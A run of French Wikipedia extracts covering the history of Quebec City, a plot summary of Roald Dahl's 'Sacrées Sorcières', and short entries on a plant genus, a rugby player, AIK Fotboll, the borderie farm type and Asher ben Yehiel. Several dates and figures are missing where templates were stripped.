Québec, même sous l’empire britannique, ne perd rien comme place forte de l’Amérique du Nord et elle est convoitée par plusieurs. Pendant la guerre d'Indépendance des États-Unis, la garnison britannique de la ville de Québec fut attaquée par les troupes américaines, les «Bastonnais» (nom donné aux rebelles américains). C'est dans la nuit du 30 au que les généraux Richard Montgomery et Benedict Arnold tentèrent un assaut contre la basse-ville qui s'avère infructueux lors de la bataille de Québec. Guy Carleton et les quelque 1800 soldats britanniques et miliciens mettent les envahisseurs en déroute. Montgomery y laissera sa vie. Les Américains devront rapidement évacuer le territoire en juin 1776. Le Canada restera alors dans le giron impérial. La guerre d’Indépendance aura comme conséquence la montée des loyalistes, des citoyens fidèles à la couronne britannique, vers le Canada.
Le Major General Isaac Brock fortifia la ville en renforçant ses murs et en élevant une batterie d'artillerie juste avant la Guerre de 1812. Au cours des premières décennies du , la haute-ville est transformée en véritable centre militaire alors que les soldats campent dans l’ancien collège des Jésuites. Les fortifications seront bonifiées à la suite de la Guerre de 1812 et la citadelle de Québec sera construite entre 1820 et 1831. La nouvelle structure a comme rôle la protection du port, de freiner l’installation ennemie sur les hauteurs des plaines d’Abraham et, enfin, de servir de point de repli ultime en cas d’attaque.
En 1832, l"'Acte pour incorporer la Cité de Québec" permet l'instauration d'un gouvernement municipal et l'apparition de la fonction de maire de Québec. Le premier maire de Québec est Elzéar Bédard et ne restera pas en poste une année n’étant à la mairie que du 1er mai 1833 au 31 mars 1834. Au cours du siècle, la corporation municipale sera occupée à divers travaux, mais la mise en place d’un aqueduc et d’un réseau d’égouts est sans doute ce qui l’accapare le plus au cours des années 1890 principalement en raison de l’impact financier qu’ont ces travaux.
En 1840, l’Acte d’Union est promulgué. Il a comme conséquence la réunion du Haut et du Bas-Canada et de créer le Canada-Uni. Il fait suite aux Rébellions patriotes de 1837-1838. La capitale de la nouvelle entité devient Kingston. Lorsque celle-ci ne convient plus, la capitale déménage à Montréal jusqu’à l’incendie du parlement en 1849. Par la suite, Québec et Toronto sont visitées en alternance par les parlementaires. En 1857, La reine Victoria tranche finalement en faveur d’Ottawa qui devient la capitale canadienne. La ville de Québec fut donc, pendant un temps, la capitale du Canada avant son transfert définitif vers Ottawa.
Au cours des années 1860, on tient dans la ville, à la suite de la conférence de Charlottetown (1864), la conférence de Québec (1864) qui porte sur la confédération canadienne. Après l’adoption de l’Acte de l’Amérique du Nord britannique, la loi constitutionnelle qui crée la Confédération canadienne, Québec devient la capitale provinciale. Quelques années plus tard, en 1871, la garnison quitte officiellement la ville. L’exode des parlementaires fait aussi mal à Québec qui voit sa population diminuer.
Au cours du , de nombreux incendies majeurs secoueront la ville, dont les incendies de l'été 1845 et le Grand incendie de Québec (). En 1845, une trentaine de rues ne sont que décombres. Pas moins de 3000 maisons sont détruites jetant à la rue des milliers de personnes. À cette époque, il s’agit du pire sinistre en Amérique du Nord.
La ville de Québec demeure, depuis sa fondation, un centre culturel et académique pour la colonie puis pour la nouvelle province de Québec. Cette réputation ne se dément pas alors que l’Université Laval, la première université francophone, est inaugurée par charte royale le 8 décembre 1852. Le projet d’université prend néanmoins racine dans le Séminaire de Québec fondé en 1663 par monseigneur François de Montmorency-Laval. C’est pourquoi on rend hommage au tout premier évêque de la Nouvelle-France lorsque vient le temps de nommer l’université.
Québec est éclairée au gaz à partir du 1er novembre 1879. La première démonstration d’électricité a lieu à Montréal quelques mois plus tôt, en mai. Rapidement, l’électricité va concurrencer le gaz et finir par prendre le dessus. En 1884, une première centrale voit le jour. Il s’agit de la centrale thermique d’Auteuil. Elle était située dans le secteur du lieu historique des fortifications de Québec. Ce n’est que l’année suivante, en 1885, qu’une première centrale hydroélectrique est mise en service au Québec : la centrale du Sault-Montmorency. Propriété de la Compagnie d’éclairage électrique de Québec et Lévis, elle permet l’illumination de la terrasse Dufferin à Québec à 20 heures, le 29 septembre 1885.
Avec l’immigration britannique, le visage de Québec change. Entre 1795 et 1818, la population double. Cela est principalement lié à la forte immigration irlandaise ainsi qu’à la venue de protestants qui choisissent de traverser l’Atlantique en direction de la nouvelle colonie. L’élite britannique qui élie demeure à Québec le fait dans la haute-ville, écartant graduellement les ouvriers qui se replient sur les franges, dans les faubourgs. En 1795, la haute-ville compte pour 40 % de la population de la ville. À l’aube des années 1820, la proportion chute à 26 %. En fait, au cours de la même période, la haute et la basse-ville ne comptent plus, ensemble, que pour 46 % de la population totale de Québec. La population se déplace en périphérie, principalement dans le faubourg Saint-Jean, et dans une moindre mesure, le faubourg Saint-Roch. En 1861, c’est 60 % des habitants de Québec qui habitent les faubourgs.
Des changements économiques s’amorcent dans les dernières décennies du . Le commerce du bois est de moins en moins actif. Cela étant principalement dû à une demande accrue en bois fini et non en billes de bois. Les avancées technologiques viennent aussi, graduellement, remettre en question la place de Québec comme centre naval. La construction d’un chenal près de Montréal permet aux navires de naviguer jusqu’à la métropole sans s’arrêter à Québec. Ce transfert d’activités vers Montréal aura comme impact l’exode de la population ouvrière, surtout irlandaise. Enfin, il s’écoule plusieurs années avant que Québec ne soit reliée par voie ferrée alors qu’on lui préfère Lévis. Tout cela, combiné au départ des parlementaires fait en sorte que le visage de Québec redevient majoritairement francophone.
Au milieu du , Québec est la demeure de près de personnes. Ce nombre n’augmente que très lentement. En 1871, la population n’est que de personnes. Ces individus continuent de faire grossir les faubourgs. Ce ne sont plus que 22 % des gens qui habitent les anciens quartiers de la haute et de la basse-ville. Au fur et à mesure que le siècle, Québec perd du terrain au profit de Montréal qui s’affirme de plus en plus comme la métropole économique du Canada. Montréal conservera ce titre jusqu’au milieu du siècle suivant alors qu’elle est elle-même déclassée par Toronto.
Au , Québec change. Pendant les premières décennies du siècle, la population augmente passant de au début des années 1900 à dans les années 1930. Cet accroissement est, entre autres, dû à un renouveau économique. Graduellement, Québec transite vers une économie de services. En devenant la capitale provinciale et alors que l’appareil administratif se développe et se professionnalise, de nouveaux parlementaires s’installent à Québec. Le nombre accru d’étudiants qui fréquentent l’université et les employés gouvernementaux ont besoin de services de proximité. Il faut répondre à la demande. La ville fait aussi sa marque dans de nouvelles industries, notamment celle de la chaussure, du corset et du tabac. Enfin, le milieu touristique se développe considérablement au cours du siècle alors qu’on table sur l’histoire de la ville, son architecture et son patrimoine pour attirer les étrangers.
En 1908, Québec célèbre son tricentenaire. Pour l’occasion, on organise de nombreuses activités pendant cette commémoration qui se termine par un défilé d’envergure à saveur historique qui se tient sur les plaines d’Abraham. La dualité et les tensions linguistiques sont bien présentes entre les francophones et les anglophones du comité organisateur. Ce dernier propose un amalgame d’événements qui présentent la fondation de Québec comme la naissance du Canada, insérant, du même coup, un caractère impérialiste à la commémoration. Ce 300e anniversaire est célébré dans le contexte, plus large, de la création du parc des Champs-de-Bataille.
En 1917, la construction du pont de Québec, reliant Québec, sur la rive nord du fleuve Saint-Laurent à sa rive sud, est achevée. L’érection de cette structure marque l’imaginaire. Il s'agit du plus long pont à structure en porte-à-faux au monde. Lors de la construction, deux effondrements de la travée centrale du pont, en 1907 et 1916, coûteront la vie à plus de 80 ouvriers.
Au printemps 1918, des manifestations contre la conscription dégénèrent en plusieurs journées d'émeutes. Envoyée en renfort, l'armée tire sur la foule et fait quatre morts. L'émeute de 1918 reste la plus violente de celles qu'a connues la ville de Québec (voir Québec, Printemps 1918). Lors de la Seconde Guerre mondiale, deux conférences interalliées furent tenues à Québec. La première rassembla en 1943 Franklin Delano Roosevelt, président des États-Unis⁣ ; Winston Churchill, premier ministre britannique; William Lyon Mackenzie King, premier ministre du Canada et T.V. Soong, ministre des affaires étrangères de la Chine. La seconde fut tenue en 1944⁣ ; Churchill et Roosevelt y participèrent. Elles furent tenues à la Citadelle de Québec et au Château Frontenac, tout près.
Au fil du siècle, le réseau autoroutier prend de l’expansion. Cela aura comme conséquence le développement accru de la banlieue en périphérie de Québec. C’est ainsi que Sainte-Foy, Charlesbourg et Beauport prennent de l’ampleur dans la dynamique régionale. Le pont Pierre-Laporte est, quant à lui, un nouveau lien de traverse qui s’avère nécessaire avec le transit automobile de plus en plus important.
Les et , c'est à Québec que fut créée l'Association internationale des maires francophones (AIMF) par l'ancien maire de Québec, Jean Pelletier et celui de Paris. Un organisme de gestion régionale voit le jour en 1970, la Communauté urbaine de Québec. Elle sera remplacée, en 2002, par la Communauté métropolitaine de Québec.
En 1984, furent tenues des festivités pour célébrer le de la venue de Jacques Cartier au Canada. C'est à cette occasion que le Vieux-Port fut restauré. D’ailleurs, pendant cette commémoration, on tient une course transatlantique entre Québec et Saint-Malo, qui rappelle le trajet effectué par l'explorateur.
C'est en 1984, à Québec que fut créée l'organisation Opération Nez rouge par Jean-Marie De Koninck. Opération Nez-Rouge est aujourd'hui connue à travers le Québec; sa formule a été reprise à travers le Canada, notamment en Colombie-Britannique et en Ontario, et dans certains pays européens.
L'arrondissement historique du Vieux-Québec est classé au patrimoine mondial de l’UNESCO en 1985. Québec demeure la seule ville en Amérique du Nord à avoir conservé ses remparts, qui regroupent les nombreux bastions, portes et ouvrages défensifs ceinturant toujours le Vieux-Québec. La haute-ville, située au sommet de la falaise, centre religieux et administratif, avec ses églises, ses couvents et autres monuments comme la redoute Dauphine, la Citadelle et le Château Frontenac, et la basse-ville, avec ses quartiers anciens, forment un ensemble urbain qui est un des meilleurs exemples de ville coloniale fortifiée. En 1970, c’est au tour de l’île d’Orléans d’être désignée comme arrondissement historique.
Les deux dernières décennies du XXe siècle sont le théâtre de nombreux événement à caractère international. À l'été 1985, Charlesbourg fut l'hôte des Jeux du Québec. En septembre 1987, c'est à Québec qu'a eu lieu la deuxième conférence du sommet de la Francophonie. En 1995, c'est à Québec que fut fêté le de l'Organisation des Nations unies pour l'alimentation et l'agriculture (FAO) puisque l'organisation a été fondée sur place en 1945. La place FAO dans la basse-ville de Québec célèbre son cinquantenaire près de la Place Royale. En 1996 fut le tour de l'Organisation des Nations unies pour l'éducation, la science et la culture (UNESCO). En 1999, a eu lieu la Conférence des parlementaires des Amériques.
En avril 2001, la ville de Québec fut l'hôte du sommet des Amériques pour discuter de l'accord de libre-échange des Amériques (ZLEA). La conférence fut marquée par des affrontements importants entre les forces policières et des groupes antimondialisation ainsi que par la décision de murer une partie de la ville autour des lieux de la conférence pour des raisons de sécurité.
Depuis le , à la suite d'une fusion municipale, la «nouvelle Ville de Québec» regroupe 11 anciennes municipalités, soit Sainte-Foy, Beauport, Charlesbourg, Sillery, Loretteville, Val-Bélair, Cap-Rouge, Saint-Émile, Vanier, Lac-Saint-Charles et l'ancienne ville de Québec.
En 2005, la Capitale-Nationale a été hôte du deuxième événement sportif international en importance au monde après les Jeux olympiques pour ce qui est du nombre de participants, soit les Jeux mondiaux des policiers et pompiers, qui furent un succès sur toute la ligne, surtout sur le plan de la participation ( athlètes et accompagnateurs, soit personnes au total). En 2006, Québec fut l'hôte des "Mondiaux Juniors Alpins Québec 2006".
Le 31 mars 2006, alors qu'il s'apprêtait à fêter son d'existence, le plus vieux zoo du Canada, le jardin zoologique du Québec, ferme ses portes par décret gouvernemental. En 2008, on célèbre le 400e anniversaire de Québec. Au cours de cette commémoration, on en profite pour revamper les rives de Québec, notamment avec la promenade Samuel-de-Champlain dont le toponyme honore le fondateur de la ville.

</doc>
<doc id="568433" url="https://fr.wikipedia.org/wiki?curid=568433" title="West Sussex">
West Sussex



</doc>
<doc id="568434" url="https://fr.wikipedia.org/wiki?curid=568434" title="Sacrées Sorcières">
Sacrées Sorcières

Sacrées Sorcières (titre original : "") est un roman pour enfants de Roald Dahl, publié en 1983 et illustré par Quentin Blake.
Le roman est traduit et publié en France aux éditions Gallimard en 1984, puis connaît de nombreuses rééditions avec des suppléments. 
Livre original, il détourne la vision habituelle des êtres fantastiques que sont les sorcières.
Résumé.
L'histoire est racontée du point de vue d'un garçon anglais de sept ans, sans nom, qui va vivre avec sa grand-mère norvégienne après que ses parents ont été tués dans un accident de voiture. Le garçon adore toutes les histoires de sa grand-mère, mais il est particulièrement captivé par celles qui parlent de sorcières réelles qui, selon elle, sont d'horribles démons féminins qui cherchent à tuer des enfants humains. Elle lui dit qu'une vraie sorcière ressemble exactement à une femme ordinaire, mais qu'il existe des moyens de savoir s'il s'agit d'une sorcière : les vraies sorcières ont des griffes à la place des ongles, qu'elles cachent en portant des gants, elles sont chauves, ce qu'elles cachent en portant des perruques qui leur provoquent des éruptions cutanées, ont des pieds carrés sans orteils qu'elles cachent en portant de petites chaussures pointues qui les gênent, ont des yeux dont les pupilles changent de couleur, ont une salive bleue qu'elles utilisent comme encre et ont des narines plus larges au bord rose et recourbé qu'elles utilisent pour renifler les enfants qui, pour une sorcière, sentent la crotte de chien, mais plus l'enfant est sale, moins la sorcière a de chances de le sentir. Sa grand-mère lui raconte aussi l'histoire de cinq enfants qui ont été attaqués par des sorcières: Ranghild est enlevée par une sorcière, Solveg est déplacé dans le tableau familial y vieillit puis y meurt, Birgit Svenson est transformée en poule pondeuse, Harald est changé en pierre et ses parents l'utilisent comme porte-parapluie et Leif est transformée en marsouin et disparait au loin dans l'océan. La grand-mère a elle aussi fait face à une sorcière, y laissant un pouce mais refuse de raconter cette histoire.
Comme le prévoit le testament des parents, le narrateur et sa grand-mère retournent en Angleterre, où il est né et a fréquenté l'école, et où se trouve la maison dont il hérite. Cependant, la grand-mère avertit le garçon qu'il doit rester sur ses gardes, car les sorcières anglaises sont connues pour être parmi les plus vicieuses du monde, réputées pour transformer les enfants en créatures détestables afin que les adultes qui ne se doutent de rien les tuent. La grand-mère lui révèle que les sorcières des différents pays ont des coutumes différentes et que, bien que les sorcières de chaque pays soient étroitement liées les unes aux autres, elles ne sont pas autorisées à communiquer avec les sorcières d'autres pays. Elle lui parle également de la mystérieuse Grande Sorcière du Monde, chef redouté et diabolique de toutes les sorcières du monde, qui visite toutes les sorcières de chaque pays, chaque année, lors d'un congrès organisé.
Peu après son retour en Angleterre, alors que le garçon travaille sur le toit de sa cabane, il fait sa première rencontre avec une sorcière. Une étrange femme en noir qui le regarde avec un sourire inquiétant et portant des gants lui demandent de descendre pour lui offrir un cadeau. Il comprend rapidement qu'il s'agit d'une sorcière et se cache dans la cime de l'arbre jusqu'à l'arrivée de sa grand-mère. 
Les vacances d'été arrivent mais au lieu de retourner en Norvège comme ils l'avaient prévu, le petit-fils et sa grand-mère partent à Bournemouth pour faciliter la convalescence de la grand-mère qui est tombée malade d'une pneumonie. Dans l'hotel le Magnificent, le jeune garçon s'amuse à entraîner des souris pour leur apprendre des tours. Un jour, le garçon se faufile alors dans la salle de bal pour jouer avec ses souris de compagnie, une salle de bal censée accueillir le congrès de la "Société royale pour la prévention de la cruauté envers les enfants". Après avoir vu des dames entrer dans la salle de bal, il se cache derrière un paravent. Lorsqu'elles passent une main gantée sous leurs cheveux pour se gratter le cuir chevelu, le garçon comprend qu'il s'agit du rassemblement annuel des sorcières anglaises et qu'il est pris au piège dans la salle désormais fermée. Une jeune femme entre en scène et enlève tout son visage, qui est un masque. Le garçon se rend compte qu'elle n'est autre que la grandissime sorcière elle-même. Elle exprime son mécontentement face à l'incapacité des sorcières anglaises à éliminer suffisamment d'enfants. Après avoir utilisé son pouvoir destructeur de "Frrite comme oune frrite !" sur une sorcière qui l'avait contredite, La Grande Haute Sorcière dévoile son plan : toutes les sorcières d'Angleterre doivent acheter des magasins de bonbons (avec de la fausse monnaie imprimée par elle à l'aide d'une machine à fabriquer de l'argent magique) et distribuer gratuitement des bonbons et des chocolats additionnés d'une goutte de sa dernière création : "Formule 86 la potion pourr bonbons à rretarrdement", une potion magique qui transforme le consommateur en souris à un moment précis fixé par la potionneuse. L'objectif est que les enseignants et les parents des enfants tuent involontairement les enfants ainsi transformés en souris à l'heure de la rentrée des classes. 
Pendant tout ce temps, le garçon est caché derrière le paravent, fasciné par ce qu'il entend mais terrifié à l'idée qu'une des sorcières le reniflent. Heureusement, il ne s'est pas lavé depuis longtemps et les sorcières ne parviennent pas à le sentir. 
Pour démontrer l'efficacité de la formule, la Grande Sorcière fait venir un enfant nommé Bruno Jenkins, un garçon riche et gourmand, attiré dans le hall de la convention par la promesse d'un chocolat gratuit. Elle révèle qu'elle a piégé Bruno en lui faisant manger la veille une barre chocolatée contenant la formule et qu'elle a réglé l'"alarme" pour qu'elle se déclenche pendant la réunion. La potion fait effet, transformant Bruno en souris devant les sorcières réunies. Peu après, les sorcières détectent la présence du narrateur et le coincent. La Grandissime Sorcière lui verse alors une bouteille entière de Formule 86 dans le gosier, et la surdose le transforme instantanément en souris. Cependant, l'enfant transformé conserve sa mentalité, sa personnalité et même sa voix, refusant d'être attiré dans un piège à souris. Après avoir retrouvé Bruno, le garçon transformé retourne dans la chambre d'hôtel de sa grand-mère et lui raconte ce qu'il a appris. Il suggère de retourner la situation contre les sorcières en glissant la potion dans leur repas du soir car sa chambre est situé au dessus de celle de la Grandissime Sorcière. Avec quelques difficultés, il parvient à mettre la main sur un flacon de potion dans la chambre de la Grande Sorcière. 
Après l'échec spectaculaire d'une tentative de rendre Bruno à ses parents (principalement à cause de la peur des souris de sa mère), la grand-mère emmène Bruno et le narrateur au réfectoire. Le narrateur entre dans la cuisine, où il verse la potion dans la soupe de pois verts destinée au dîner des sorcières. En revenant de la cuisine, un cuisinier aperçoit le narrateur et lui coupe une partie de la queue avec un couteau à découper, avant qu'il ne parvienne à s'enfuir et à rejoindre sa grand-mère. Les sorcières se transforment toutes en souris en quelques minutes, après avoir fait une overdose massive comme le narrateur. Le personnel de l'hôtel et les clients paniquent et finissent par tuer, sans le savoir, la grande sorcière et toutes les sorcières d'Angleterre. La grand-mère rend aussi Bruno à son père qui l'accepte comme il est, et tente de convaincre sa mère de l'accepter.
De retour à la maison, le garçon et sa grand-mère élaborent un plan pour débarrasser le monde des sorcières. En se faisant passer pour le chef de la police norvégienne au téléphone, elle découvre que la Grande Sorcière vit dans un château de ce pays. Ils se rendent au château norvégien de la Grande Sorcière et utilisent la potion pour transformer son successeur et ses assistants en souris, puis libèrent des chats pour les détruire. Grâce à la machine à gagner de l'argent de la Grande Sorcière et aux informations sur les sorcières dans les différents pays, ils essaieront de les éradiquer partout. La grand-mère révèle qu'en tant que souris, le garçon ne vivra probablement que neuf ans de plus, mais le garçon s'en moque, car il ne veut pas survivre à sa grand-mère (elle révèle qu'elle ne vivra probablement que neuf ans de plus), car il n'aimerait pas que quelqu'un d'autre s'occupe de lui.
Commentaires.
Ce livre, très connu aux États-Unis depuis 1983, est conseillé en France par le Ministère de l'Éducation nationale.
Polémiques et réécritures.
Le roman a connu comme d'autres œuvres de Roald Dahl des modifications et des réécritures en 2022. C'est une démarche de l'éditeur Puffin et Roald Dahl Story Company dans le but de supprimer les éléments de langage jugés offensants. Le texte de 1983 a donc connu des modifications et des ajouts pour qu'il puisse continuer de correspondre à tous.
Il y a l'ajout de la phrase 
Il y a également une modification de texte lors d'une énumération de métiers que peuvent pratiquer des femmes, passant de dans la version originale à dans la réédition.
Ces réécritures ont créé de nombreuses polémiques au Royaume Uni, elles sont très disputées et critiquées notamment par l'écrivain Salman Rushdie

</doc>
<doc id="568435" url="https://fr.wikipedia.org/wiki?curid=568435" title="Harrison Stafford">
Harrison Stafford



</doc>
<doc id="568443" url="https://fr.wikipedia.org/wiki?curid=568443" title="Pardoglossum">
Pardoglossum

Le genre Pardoglossum regroupe 4 ou 5 espèces de plantes herbacées de la famille des Boraginacées originaires de l'ouest du bassin méditerranéen. Une seule espèce est présente en Europe, la cynoglosse à feuilles de giroflée ("Pardoglossum cheirifolium").

</doc>
<doc id="568448" url="https://fr.wikipedia.org/wiki?curid=568448" title="Jean-Patrick Lescarboura">
Jean-Patrick Lescarboura

, né le à Monein, est un joueur français de rugby à XV, international français, qui évolue au poste de demi d'ouverture. Il joue au sein de l'effectif du club français de l'US Dax, qu'il entraîne plus tard.
Biographie.
Sa carrière a été contrariée par de nombreuses blessures. Il est le recordman de drops réussis en équipe France avec . Le , il joue avec les Barbarians français contre l'Argentine à Dax. Les "Baa-Baas" s'inclinent 8 à 22.
À l'occasion de la réception du SC Tulle en championnat 1983-84, il bat le record de points inscrits par un joueur en championnat avec 37 points soit 4 essais, neufs transformations et une pénalité.
Le , il joue une deuxième fois avec les Barbarians français contre les Harlequins au Stade de Twickenham. Les "Baa-Baas" l'emportent 42 à 20.
Il inscrit deux essais contre les "" le , meilleure performance individuelle de ce type.
Le , il joue avec les Barbarians français contre le Penarth RFC à Penarth au Pays de Galles. Les "Baa-Baas" l'emportent 48 à 13.
Le , il connaît sa dernière sélection en équipe de France lors du test-match France-Roumanie à Auch. Il y marque ses deux dernières pénalités. Lors de ce match, perdu finalement 6 à 12 dans des conditions dantesques, le capitaine Philippe Dintrans fait également ses adieux à l'équipe de France et Jacques Fouroux titularise pour la première fois le jeune Philippe Saint-André.
Le , il est invité pour jouer avec les Barbarians français contre le XV du Président pour le Centenaire du rugby à Grenoble. Les "Baa-Baas" s'imposent 92 à 34.
Il a également entraîné plus tard l'US Dax.
Famille.
Ses fils, Baptiste et Julien, jouent également au rugby à XV.
Formé à l'US Dax, Baptiste rejoint ensuite la Belgique, évoluant avec le Kituro RC en championnat de Belgique. Il porte plus tard le maillot national de l'équipe de Belgique.
Julien évolue pour sa part sous le maillot du RC Drancy.

</doc>
<doc id="568450" url="https://fr.wikipedia.org/wiki?curid=568450" title="AIK Fotboll">
AIK Fotboll

AIK Fotboll est la section football du club omnisports suédois AIK de la ville de Solna. Fondé en 1891, le club évolue en Allsvenskan depuis 2005.
Le club est communément désigné sous le nom de "AIK", alors que ses propres supporters les appellent les "Gnaget" (du suédois "gnagare", une catégorie de rongeurs) depuis les années 1920, quand le club, pour faire des économies, utilisait le même jeu de maillots pendant plusieurs saisons, ce dernier devenant gris au fur et à mesure des lavages. L'équipe première évolue dans le stade de Friends Arena, situé dans la commune de Solna au nord de Stockholm.
Le club a une rivalité de longue date avec un autre club de Stockholm, Djurgårdens IF, en raison de leur proximité géographique et de leur année de création, 1891. Les matches entre les deux équipes sont appelés "Tvillingderbyt" (le "derby des jumeaux" en suédois).
L'AIK a remporté 14 fois le Championnat de Suède de football et 9 Coupes de Suède.
Bilan sportif.
Bilan européen.
Résultats.
"Note : dans les résultats ci-dessous, le score du club est toujours donné en premier"
Structures du club.
Stades.
Depuis sa création en 1896 et jusqu’en 1901, l’AIK dispute ses matchs à domicile à Gärdet, puis à Lindarängen, deux terrains situés à l’est du quartier d’Östermalm. C’est sur la pelouse de Lindarängen que le club va décrocher son premier titre de champion de Suède en 1900 en battant le quadruple champion en titre, Örgryte IS.
Le club déménage par la suite à quelques encablures de Gärdet, à Idrottsparken, un stade situé à l’emplacement du futur Stade Olympique de Stockholm. L’AIK y évoluera jusqu’en 1910.
En 1909, la Suède hérite de l’organisation des jeux olympiques d'été de 1912. Ne disposant pas de stade d’une capacité suffisante, l’association suédoise chargée de la promotion du sport (Sveriges Centralförening för Idrottens Främjande, SCIF) décide alors la construction d’un nouveau stade d’environ à l’emplacement d’Idrottsparken.
Privé de son arène, l’AIK est contraint de déménager dans la commune de Solna, au Råsundavägen IP, où il évoluera pendant toute la durée de la construction du Stockholms Olympiastadion (1910-1912).
À l’issue des Jeux Olympiques de 1912, l’AIK et ses trois titres de champions de Suède (1900, 1901 et 1911) s’installent au Stade Olympique. Le club y remportera 4 titres de champion supplémentaires jusqu’à son départ en 1936 (en 1914, 1916, 1923 et 1932).
Porté par un nombre toujours plus important de supporters, le club se retrouve petit à petit à l’étroit au Stade Olympique. C’est ainsi qu’est décidée la construction d’un nouveau stade destiné à accueillir à la fois le club et également l’équipe nationale de football suédoise : le Råsunda.
Laissant le Stade Olympique au grand rival Djurgårdens IF, l’AIK s’installe au Råsunda début 1937 : le match inaugural a lieu le dans un stade flambant neuf, installé dans le quartier de Råsunda dans la commune de Solna. AIK y affronte pour l’occasion le club de Malmö FF et l’emporte sur le score de 4-0.
L’AIK va évoluer à Råsunda jusqu’en 2012. Le club dispute son dernier match officiel dans son enceinte historique le dans le cadre de la phase de poule de la Ligue Europa. L’AIK affronte à cette occasion le S.S.C. Naples devant (défaite 2-1, but de Helgi Danielsson pour l’AIK contre un but de Dzemali et un penalty de Cavani dans le temps additionnel de la seconde période).
Dès le début des années 2000, des voix se sont élevées pour souligner la nécessité pour le football suédois de disposer d’une vitrine plus moderne, alors même que le Råsundastadion ne répondait plus aux normes internationales de sécurité et de capacité. En , la Fédération suédoise de football décide la construction d’un nouveau stade (plutôt que la simple rénovation du Råsundastadion) afin d'accueillir les matchs de l’AIK et ceux de l’équipe nationale de football de Suède.
L’AIK a joué son premier match à la Friends Arena le devant . À cette occasion, le club affrontait le HJK Helsinki dans le cadre d’un match de préparation à la saison 2013 de Allsvenskan. Le match a été remporté par les locaux sur le score de 1-0, l’histoire retenant Sam Lundholm comme étant le premier buteur du club dans son nouveau stade.
Le premier match du club en compétition officielle a eu lieu deux semaines plus tard, le , à l’occasion de la deuxième journée de Allsvenskan. Opposé à l’équipe de Syrianska FC, l’AIK ne peut obtenir mieux que le match nul 0-0. À cette occasion, le club a établi un nouveau record d’affluence du club pour un match à domicile en Allsvenskan, avec (effaçant ainsi le précédent record datant de 1975, quand avaient assisté à un match entre l’AIK et Djurgården).
Rivalités et derbys.
Tvillingderbyt.
Généralement considéré comme le derby le plus important de Suède, le "derby des jumeaux" voit s’affronter l'AIK et Djurgårdens IF, les deux clubs ayant remporté le plus grand nombre de titres de champions de Suède (11 chacun). La rivalité entre les deux clubs existe depuis 1891, année de fondation des deux clubs (à seulement trois semaines d'intervalle), rivalité qui s’est accentuée avec la création de leurs sections football en 1896. Depuis 1891, les deux clubs se sont affrontés 228 fois, toutes compétitions confondues (83 victoires pour l’AIK, 82 pour Djurgården), dont 113 fois en Allsvenskan (42 victoires pour l’AIK, 29 victoires pour Djurgården).
Tvåfärgsderbyt.
Le "derby des deux couleurs" oppose l'AIK, qui a ses racines au nord de la ville, à Hammarby IF dont le siège se situe au sud. Bien qu’existante, la rivalité entre ces deux clubs est généralement considérée comme moins importante que celle rencontrée lors autres derbys de Stockholm (AIK-Djurgården et Djurgården-Hammarby).
Autres rivalités.
Brommapojkarna.
Si les matchs opposant l’AIK à Brommapojkarna peuvent également être assimilés à des derbys de Stockholm d’un point de vue purement géographique, l’affiche ne revêt généralement pas les mêmes enjeux que les autres derbys de la capitale : Brommapojkarna n’a disputé jusqu’à présent que 4 saisons dans l’élite et ne dispose pas d’un public très nombreux (environ en moyenne lors des matchs à domicile pendant la saison 2013).
IFK Göteborg.
Les matchs entre l’AIK et l’IFK Göteborg sont le plus important derby entre un club basé à Stockholm et un club basé à Göteborg. Il s’agit à la fois d’une rivalité sur le plan footballistique (l’IFK Göteborg ayant remporté 18 titres de champion de Suède) mais également sur le plan géographique, le match opposant le club phare de la capitale au club phare de la deuxième ville du pays.
Personnalités du club.
Numéros retirés.
"(Mise à jour en date du )"

</doc>
<doc id="568451" url="https://fr.wikipedia.org/wiki?curid=568451" title="Borderie (agriculture)">
Borderie (agriculture)

Une borderie est une exploitation agricole petite ou moyenne (moins de 10 à 15 ha). Dans l'ouest de la France, il existe deux sortes d'exploitations agricoles : les grandes sont les métairies (elles font 20 à 60 ha selon les régions), les petites qui font moins de 15 ha et souvent moins de 10 s'appellent closeries borderies, bordages ou encore borderages.
La métairie est donc exploitée par le laboureur, le bordage est exploité par le bordager ou "bordier". . Le laboureur a souvent un niveau de vie plus aisé que le bordager. D'ailleurs certains laboureurs sont parfois propriétaires d'un bordage.
Le mot borderie vient du francique " bord" signifiant planche, en référence au mode de construction de l'habitation de l'exploitant, souvent réalisée en bois. On retrouve d'ailleurs cette racine en anglais ("board" désignant une planche) ou en suédois ("bord" signifiant table). Par extension, une borderie peut donc désigner une habitation à pans de bois. Les dialectes occitans du sud-ouest de la France (gascon, limousin, languedocien) utilisent le mot féminin "bòrda" pour désigner une ferme, une grange ou une métairie.
La Borderie, petite exploitation dont les terres sont exploitées par une paire de bœufs.
Exemple près de La Rochelle : la Borderie du Gô (XVIIe).

</doc>
<doc id="568452" url="https://fr.wikipedia.org/wiki?curid=568452" title="Allmänna Idrottsklubben">
Allmänna Idrottsklubben

L'Allmänna Idrottsklubben ("AIK"), qui se traduit par "Club de sports public", est un club sportif situé dans la municipalité de Solna, dans la banlieue nord de la capitale suédoise Stockholm. Ce club est actif dans plusieurs disciplines, comme le football, le hockey sur glace et l'unihockey.

</doc>
<doc id="568454" url="https://fr.wikipedia.org/wiki?curid=568454" title="Asher ben Yehiel">
Asher ben Yehiel

Rabbenou Asher ben Yehiel (1250, Allemagne - 1327, Tolède, Espagne), dit le Rosh (hébreu הרא"ש), est l’un des principaux décisionnaires de l’époque des Rishonim, les Maîtres médiévaux. Éminent talmudiste, il est l'élève - et le gendre - de Rabbi Meïr de Rothenburg.
Descendant d’une longue lignée rabbinique dont l’origine remonte jusqu’à Rabbenou Guershom ben Yehouda, il est l'arrière-petit-fils de Rabbi Eliezer ben Nathan de Mayence, l’un des "guedolei hador" (« Grands de sa génération »). Son père Rabbi Yehiel ben Rabbi Ouri était l’un des "Hassidei Ashkenaz" (« piétistes rhénans »), et l’un des compagnons du "Roqéah" et de Rabbi Yehouda Hahassid. Son fils Yaakov ben Asher est l'auteur du code de loi appelé Arbaa Tourim.
Son œuvre.
